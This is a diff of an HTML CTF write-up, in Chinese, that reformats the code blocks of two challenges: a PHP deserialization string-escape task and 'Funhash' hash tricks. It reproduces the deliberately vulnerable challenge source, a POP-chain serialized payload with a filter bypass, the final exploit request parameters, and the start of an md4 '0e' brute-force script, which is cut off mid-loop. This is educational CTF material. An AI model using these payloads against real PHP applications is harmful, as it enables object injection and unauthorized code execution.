@@ -389,61 +389,272 @@
 <h2 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h2><blockquote>
 <p>php反序列化字符串逃逸</p>
 </blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// common.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $user;</span><br><span class="line">    <span class="keyword">protected</span> $pass;</span><br><span class="line">    <span class="keyword">protected</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass, $admin = <span class="number">0</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = $pass;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = $admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">'Riven'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"function"</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"object"</span>)&#123;</span><br><span class="line">            $name = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">            $name();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;TP();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">'Yasuo'</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">'Yasuo'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"No Yasuo! No Soul!\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Gank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">'Yasuo'</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Are you orphan?\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Must Be Yasuo!\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">"Lee Sin"</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">"whoami"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;KS();  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">// common.php
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.php"</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line">	$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">	$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">	$player = <span class="keyword">new</span> player($username, $password);</span><br><span class="line">	file_put_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]), write(serialize($player))); </span><br><span class="line">	<span class="keyword">echo</span> sprintf(<span class="string">'Welcome %s, your ip is %s\n'</span>, $username, $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Please input the username or password!\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+&lt;?php
+class player{
+    protected $user;
+    protected $pass;
+    protected $admin;
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// common.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    $data = str_replace(<span class="string">'\0*\0'</span>, chr(<span class="number">0</span>).<span class="string">"*"</span>.chr(<span class="number">0</span>), $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    $data = str_replace(chr(<span class="number">0</span>).<span class="string">"*"</span>.chr(<span class="number">0</span>), <span class="string">'\0*\0'</span>, $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($data, <span class="string">'name'</span>)!==<span class="keyword">False</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Name Pass\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+    public function __construct($user, $pass, $admin = 0){
+        $this-&gt;user = $user;
+        $this-&gt;pass = $pass;
+        $this-&gt;admin = $admin;
+    }
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// play.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.php"</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">var_dump(read(check(file_get_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>])))));</span><br><span class="line"></span><br><span class="line">@$player = unserialize(read(check(file_get_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>])))));</span><br><span class="line">print_r($player);</span><br><span class="line"><span class="keyword">if</span> ($player-&gt;get_admin() === <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"FPX Champion\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"The Shy unstoppable\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+    public function get_admin(){
+        return $this-&gt;admin;
+    }
+}
 
+class topsolo{
+    protected $name;
+
+    public function __construct($name = &#39;Riven&#39;){
+        $this-&gt;name = $name;
+    }
+
+    public function TP(){
+        if (gettype($this-&gt;name) === &quot;function&quot; or gettype($this-&gt;name) === &quot;object&quot;){
+            $name = $this-&gt;name;
+            $name();
+        }
+    }
+
+    public function __destruct(){
+        $this-&gt;TP();
+    }
+
+}
+
+class midsolo{
+    protected $name;
+
+    public function __construct($name){
+        $this-&gt;name = $name;
+    }
+
+    public function __wakeup(){
+        if ($this-&gt;name !== &#39;Yasuo&#39;){
+            $this-&gt;name = &#39;Yasuo&#39;;
+            echo &quot;No Yasuo! No Soul!\n&quot;;
+        }
+    }
+
+
+    public function __invoke(){
+        $this-&gt;Gank();
+    }
+
+    public function Gank(){
+        if (stristr($this-&gt;name, &#39;Yasuo&#39;)){
+            echo &quot;Are you orphan?\n&quot;;
+        }
+        else{
+            echo &quot;Must Be Yasuo!\n&quot;;
+        }
+    }
+}
+
+class jungle{
+    protected $name = &quot;&quot;;
+
+    public function __construct($name = &quot;Lee Sin&quot;){
+        $this-&gt;name = $name;
+    }
+
+    public function KS(){
+        system(&quot;whoami&quot;);
+    }
+
+    public function __toString(){
+        $this-&gt;KS();  
+        return &quot;&quot;;  
+    }
+
+}
+?&gt;</code></pre>
+<pre><code class="php">// index.php
+
+&lt;?php
+@error_reporting(0);
+require_once &quot;common.php&quot;;
+require_once &quot;class.php&quot;;
+
+if (isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])){
+    $username = $_GET[&#39;username&#39;];
+    $password = $_GET[&#39;password&#39;];
+    $player = new player($username, $password);
+    file_put_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]), write(serialize($player))); 
+    echo sprintf(&#39;Welcome %s, your ip is %s\n&#39;, $username, $_SERVER[&#39;REMOTE_ADDR&#39;]);
+}
+else{
+    echo &quot;Please input the username or password!\n&quot;;
+}
+
+?&gt;
+</code></pre>
+<pre><code class="php">// common.php
+
+&lt;?php
+function read($data){
+    $data = str_replace(&#39;\0*\0&#39;, chr(0).&quot;*&quot;.chr(0), $data);
+    return $data;
+}
+function write($data){
+    $data = str_replace(chr(0).&quot;*&quot;.chr(0), &#39;\0*\0&#39;, $data);
+    return $data;
+}
+
+function check($data)
+{
+    if(stristr($data, &#39;name&#39;)!==False){
+        die(&quot;Name Pass\n&quot;);
+    }
+    else{
+        return $data;
+    }
+}
+?&gt;</code></pre>
+<pre><code class="php">// play.php
+
+&lt;?php
+@error_reporting(0);
+require_once &quot;common.php&quot;;
+require_once &quot;class.php&quot;;
+
+var_dump(read(check(file_get_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])))));
+
+@$player = unserialize(read(check(file_get_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])))));
+print_r($player);
+if ($player-&gt;get_admin() === 1){
+    echo &quot;FPX Champion\n&quot;;
+}
+else{
+    echo &quot;The Shy unstoppable\n&quot;;
+}
+
+?&gt;
+</code></pre>
 <p>先找出payload</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> topsolo(<span class="keyword">new</span> midsolo(<span class="keyword">new</span> jungle(<span class="string">'Tyao'</span>)));</span><br><span class="line">$b = <span class="keyword">new</span> player(<span class="string">'Tyao'</span>,$a,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line"></span><br><span class="line">O:<span class="number">6</span>:<span class="string">"player"</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">"*user"</span>;s:<span class="number">4</span>:<span class="string">"Tyao"</span>;s:<span class="number">7</span>:<span class="string">"*pass"</span>;O:<span class="number">7</span>:<span class="string">"topsolo"</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">"*name"</span>;O:<span class="number">7</span>:<span class="string">"midsolo"</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">"*name"</span>;O:<span class="number">6</span>:<span class="string">"jungle"</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">"*name"</span>;s:<span class="number">4</span>:<span class="string">"Tyao"</span>;&#125;&#125;&#125;s:<span class="number">8</span>:<span class="string">"*admin"</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$a = new topsolo(new midsolo(new jungle(&#39;Tyao&#39;)));
+$b = new player(&#39;Tyao&#39;,$a,1);
+echo serialize($b);
 
+O:6:&quot;player&quot;:3:{s:7:&quot;*user&quot;;s:4:&quot;Tyao&quot;;s:7:&quot;*pass&quot;;O:7:&quot;topsolo&quot;:1:{s:7:&quot;*name&quot;;O:7:&quot;midsolo&quot;:1:{s:7:&quot;*name&quot;;O:6:&quot;jungle&quot;:1:{s:7:&quot;*name&quot;;s:4:&quot;Tyao&quot;;}}}s:8:&quot;*admin&quot;;i:1;}</code></pre>
 <p>利用字节流S绕过对name的检测</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"player"</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">"*user"</span>;s:<span class="number">4</span>:<span class="string">"Tyao"</span>;s:<span class="number">7</span>:<span class="string">"*pass"</span>;O:<span class="number">7</span>:<span class="string">"topsolo"</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00n\61me"</span>;O:<span class="number">7</span>:<span class="string">"midsolo"</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00n\61me"</span>;O:<span class="number">6</span>:<span class="string">"jungle"</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00n\61me"</span>;s:<span class="number">4</span>:<span class="string">"Tyao"</span>;&#125;&#125;&#125;s:<span class="number">8</span>:<span class="string">"*admin"</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">O:6:&quot;player&quot;:3:{s:7:&quot;*user&quot;;s:4:&quot;Tyao&quot;;s:7:&quot;*pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;s:4:&quot;Tyao&quot;;}}}s:8:&quot;*admin&quot;;i:1;}</code></pre>
 <p>查看正常的序列化数据</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"player"</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">"*user"</span>;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">7</span>:<span class="string">"*pass"</span>;s:<span class="number">3</span>:<span class="string">"pwd"</span>;s:<span class="number">8</span>:<span class="string">"*admin"</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">O:6:&quot;player&quot;:3:{s:7:&quot;*user&quot;;s:4:&quot;user&quot;;s:7:&quot;*pass&quot;;s:3:&quot;pwd&quot;;s:8:&quot;*admin&quot;;i:0;}</code></pre>
 <p>修改【pwd】的值使其和我们的payload匹配，顺便修改个长度</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"player"</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">"*user"</span>;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">7</span>:<span class="string">"*pass"</span>;s:<span class="number">154</span>:<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;s:7:"</span>*pass<span class="string">";O:7:"</span>topsolo<span class="string">":1:&#123;S:7:"</span>\<span class="number">00</span>*\<span class="number">00</span>n\<span class="number">61</span>me<span class="string">";O:7:"</span>midsolo<span class="string">":1:&#123;S:7:"</span>\<span class="number">00</span>*\<span class="number">00</span>n\<span class="number">61</span>me<span class="string">";O:6:"</span>jungle<span class="string">":1:&#123;S:7:"</span>\<span class="number">00</span>*\<span class="number">00</span>n\<span class="number">61</span>me<span class="string">";s:4:"</span>Tyao<span class="string">";&#125;&#125;&#125;s:8:"</span>*admin<span class="string">";i:1;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>;s:<span class="number">8</span>:<span class="string">"\0*\0admin"</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">O:6:&quot;player&quot;:3:{s:7:&quot;*user&quot;;s:4:&quot;user&quot;;s:7:&quot;*pass&quot;;s:154:&quot;
 
+;s:7:&quot;*pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;s:4:&quot;Tyao&quot;;}}}s:8:&quot;*admin&quot;;i:1;}
+
+&quot;;s:8:&quot;\0*\0admin&quot;;i:0;}</code></pre>
 <p>计算多出来的数据的长度</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len(<span class="string">'";s:7:"*pass";s:158:'</span>) == <span class="number">22</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">len(&#39;&quot;;s:7:&quot;*pass&quot;;s:158:&#39;) == 22</code></pre>
 <blockquote>
 <p>%00*%00pass还有两个隐藏字符，下面的payload也不要忘记加上</p>
 </blockquote>
 <p>每次字符串逃逸可以多出2个字符，所以修改username为11个<code>\0*\0</code></p>
 <p>最终exp如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span></span><br><span class="line">password=;s:<span class="number">7</span>:<span class="string">"%00*%00pass"</span>;O:<span class="number">7</span>:<span class="string">"topsolo"</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00n\61me"</span>;O:<span class="number">7</span>:<span class="string">"midsolo"</span>:<span class="number">2</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00n\61me"</span>;O:<span class="number">6</span>:<span class="string">"jungle"</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00n\61me"</span>;s:<span class="number">0</span>:<span class="string">""</span>;&#125;&#125;&#125;;s:<span class="number">8</span>:<span class="string">"*admin"</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0
+password=;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;s:0:&quot;&quot;;}}};s:8:&quot;*admin&quot;;i:1;}</code></pre>
 <h2 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h2><blockquote>
 <p>哈希tricks</p>
 </blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"hash1"</span>] != hash(<span class="string">"md4"</span>, $_GET[<span class="string">"hash1"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 1 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'hash2'</span>] === $_GET[<span class="string">'hash3'</span>] || md5($_GET[<span class="string">'hash2'</span>]) !== md5($_GET[<span class="string">'hash3'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 2 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">"SELECT * FROM flag WHERE password = '"</span> . md5($_GET[<span class="string">"hash4"</span>],<span class="keyword">true</span>) . <span class="string">"'"</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+include &#39;conn.php&#39;;
+highlight_file(&quot;index.php&quot;);
+//level 1
+if ($_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;]))
+{
+    die(&#39;level 1 failed&#39;);
+}
 
+//level 2
+if($_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;]))
+{
+    die(&#39;level 2 failed&#39;);
+}
+
+//level 3
+$query = &quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;;
+$result = $mysqli-&gt;query($query);
+$row = $result-&gt;fetch_assoc(); 
+var_dump($row);
+$result-&gt;free();
+$mysqli-&gt;close();
+
+?&gt;</code></pre>
 <p>hash4强哈希碰撞，后面是凑出or 1，直接百度就行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$int=<span class="number">1</span>;</span><br><span class="line">$md4=<span class="string">""</span>;</span><br><span class="line">$name=<span class="string">"0e"</span>;</span><br><span class="line"><span class="keyword">while</span> ($md4!=$name)&#123;</span><br><span class="line">    $name=<span class="string">'0e'</span>.$int;</span><br><span class="line">    $int++;</span><br><span class="line">    $md4=hash(<span class="string">'md4'</span>,$name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $name;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">&lt;?php
+$int=1;
+$md4=&quot;&quot;;
+$name=&quot;0e&quot;;
+while ($md4!=$name){
